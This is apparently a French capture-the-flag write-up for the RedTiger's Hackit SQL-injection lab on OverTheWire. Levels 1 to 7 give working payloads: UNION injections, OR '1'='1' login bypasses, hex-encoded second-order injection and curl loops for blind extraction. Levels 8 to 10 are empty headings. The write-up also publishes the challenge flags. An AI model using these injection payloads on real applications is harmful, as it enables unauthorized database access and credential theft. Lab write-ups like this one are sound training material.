RedTigers-Hackit
================
https://redtiger.labs.overthewire.org/

##Level 1 : Simple SQL-Injection
```
https://redtiger.labs.overthewire.org/level1.php?cat=1%20union%20select%201,2,username,password%20from%20level1_users
```
  You made it dude!

  The password for the next level is: easylevelsareeasy_! 
   
##Level 2 : Simple login-bypass
```
username : a' OR '1'='1
password : a' OR '1'='1
```
  The password for the next level is: securitycat_says_meow_and_likes_cheese 
  
##Level 3 : Get an error

  Génération de l'erreur :
```
https://redtiger.labs.overthewire.org/level3.php?usr%5B0%5D=a&usr%5B1%5D=b
```
Warning: preg_match() expects parameter 2 to be string, array given in /var/www/hackit/urlcrypt.inc on line 21

```PHP
<?php
  		
	function encrypt($str)
	{
		$cryptedstr = "";
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ 192;
			
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
  
	function decrypt ($str)
	{
		if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
		{
			$str = base64_decode($str);
			if ($str != "" && $str != null && $str != false)
			{
				$decStr = "";
				
				for ($i=0; $i < strlen($str); $i+=3)
				{
					$array[$i/3] = substr($str,$i,3);
				}

				foreach($array as $s)
				{
					$a = $s^192;
					$decStr .= chr($a);
				}
				
				return $decStr;
			}
			return false;
		}
		return false;
	}
?>
```
on le stocke dans un fichier php auquel on ajoute 
```php
echo encrypt($argv[1]);
```

plus qu'à trouver le nombre de champs et afficher le mot de passe 
```
curl --insecure -b level3login=securitycat_says_meow_and_likes_cheese https://redtigire.org/level3.php?usr=`php toto.php "' union select 1,username,3,4,5,password,7 from level3_users where username='Admin "` 
```
 Login correct. You are admin :); 
 The password for the next level is: dont_publish_solutions_GRR! 
 
##Level 4 : Blind Injection
   Identification de la taille du mot à trouver
```nix
https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29%3C10
=> 2 rows
https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29%3C20
=> 1 row ==> taille entre 10 et 20 caractères
https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29=17
=> mot de 17 caractères

on devine maintenant le mot
for i in {1..17}; do
	for x in {a..z}; do 
	curl --insecure -b level4login=dont_publish_solutions_GRR%21 "https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20SUBSTR(keyword,$i,1)='$x'" 2>/dev/null |grep "2 rows"
	rc=$?
	if [[ $rc == 0 ]] ; then
		echo $x
		break;
	fi

	done
done
manque les derniers caractères :-(

for i in {14..17}; do
	for x in {0..9}; do
	curl --insecure -b level4login=dont_publish_solutions_GRR%21 "https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20SUBSTR(keyword,$i,1)='$x'" 2>/dev/null |grep "2 rows"
	rc=$?
	if [[ $rc == 0 ]] ; then
		echo $x
		break;
	fi

	done
done

==> blindinjection123
```
 Word correct. 
 The password for the next level is: bananas_are_not_yellow-sometimes

##Level 5 : Advanced login-bypass
```nix
echo -n toto | md5sum
f71dbe52628a3f83a77ab494817525c6  -

login : ' union 'pouet', 'f71dbe52628a3f83a77ab494817525c6
passwd : f71dbe52628a3f83a77ab494817525c6
```
  Login successful!
  
  The password for the next level is: my_cat_says_meow_meowmeow 
  
##Level 6 : SQL-Injection
```nix
https://redtiger.labs.overthewire.org/level6.php?user=0%20or%20status=1
==> 
Username: 	admin
Email: 	admin@localhost
1er user avec status=1 est admin

https://redtiger.labs.overthewire.org/level6.php?user=0%20union%20select%201,username,1,1,1%20from%20level6_users%20where%20status=1
==> username est utilisé pour une seconde requête

pour injecter dans la seconde requête, on encode en hexadécimal (équivalent de HEX() sql mais désactivé pour l'exercice)
echo -n "' union select 1,2,3,4,5 from level6_users where id=3 -- " | xxd -p | tr -d '\n'
==> 2720756e696f6e2073656c65637420312c322c332c342c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20

https://redtiger.labs.overthewire.org/level6.php?user=0%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20,1,1,1%20from%20level6_users%20where%20status=1
==> On obtient les n° de champs
Username: 	2
Email: 	4

echo -n "' union select 1,username,3,password,5 from level6_users where id=3 -- " | xxd -p | tr -d '\n'
ttps://redtiger.labs.overthewire.org/level6.php?user=0%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20,1,1,1%20from%20level6_users%20where%20status=1
==> on obtient le mot de pase
Username: 	admin
Email: 	m0nsterk1ll
```
 Login correct. 
 The password for the next level is: dont_shout_at_your_disks*** 
 
##Level 7 : SQL-Injection
  On valide le formulaire de recherche avec dans le champ de saisie la chaine bidon'
  On obtient la requête utilisée :
```SQL
SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%bidon'%' OR text.title LIKE '%bidon'%')
```
La recherche suivante nous indique la taille du nom de l'auteur :
```SQL
google%' and length(news.autor)=17 and '%'='
```
Compte tenu des limitations SQL, on recherche les caractères composant le nom avec LOCATE :
```nix
for i in {1..17}; do
for x in `echo {A..Z} {a..z} {0..9}`; do 
	curl -s --insecure -b level7login=dont_shout_at_your_disks%2A%2A%2A https://redtiger.labs.overthewire.org/level7.php -d "dosearch=search\!&search=google%' and locate('$x',news.autor,$i)=1 and '%'='" | grep "FRANCISCO"
	rc=$?
	
	
	if [[ $rc == 0 ]] ; then

		echo "found : $x"
		break;
	
	fi
done
done
```
==> TESTUSERFORG00GLE
PB : pas de distinction majuscules/minuscules avec LOCATE :'-(
utilisation de locate('$x',news.autor COLLATE latin1_general_cs,$i)=$i
==> TestUserforg00gle
 User correct.

The password for the next level is: MOOcowMEOWcatOinkPIG 

##Level 8 : SQL-Injection
##Level 9 : SQL-Injection
##Level 10
